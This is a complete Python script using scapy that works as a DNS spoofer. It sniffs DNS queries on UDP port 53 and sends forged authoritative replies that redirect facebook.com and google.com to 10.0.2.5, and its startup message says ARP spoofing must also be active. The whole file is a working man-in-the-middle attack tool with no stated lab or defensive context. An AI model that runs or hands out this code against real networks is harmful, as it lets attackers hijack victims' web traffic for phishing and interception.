#!/usr/bin/env python3
from scapy.all import *

dns_hosts = {
    b"facebook.com.": "10.0.2.5",
    b"www.facebook.com.": "10.0.2.5",
    b"google.com.": "10.0.2.5",
    b"www.google.com.": "10.0.2.5"
}


def process_packet(packet):
    if packet.haslayer(DNSQR) and packet[DNS].opcode == 0 and packet[DNSQR].qtype == 1:
        qname = packet[DNSQR].qname

        if qname in dns_hosts:
            print(f"SPOOFING: {qname.decode()} -> {dns_hosts[qname]}")

            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                         UDP(dport=packet[UDP].sport, sport=53) / \
                         DNS(
                             id=packet[DNS].id,
                             qr=1,
                             aa=1,
                             ra=1,
                             qd=packet[DNS].qd,
                             an=DNSRR(
                                 rrname=qname,
                                 type='A',
                                 rclass='IN',
                                 ttl=600,
                                 rdata=dns_hosts[qname]
                             )
                         )

            send(spoofed_pkt, verbose=False)
            print(f"Sent spoofed response to {packet[IP].src}")
        else:
            print(f"Query: {qname.decode()} (not spoofed)")

if __name__ == "__main__":
    print("DNS Spoofer Started - Listening for DNS queries")
    print("Make sure ARP spoofing is active")
    print("Press Ctrl+C to stop")

    try:
        sniff(filter="udp port 53", prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("DNS Spoofer stopped")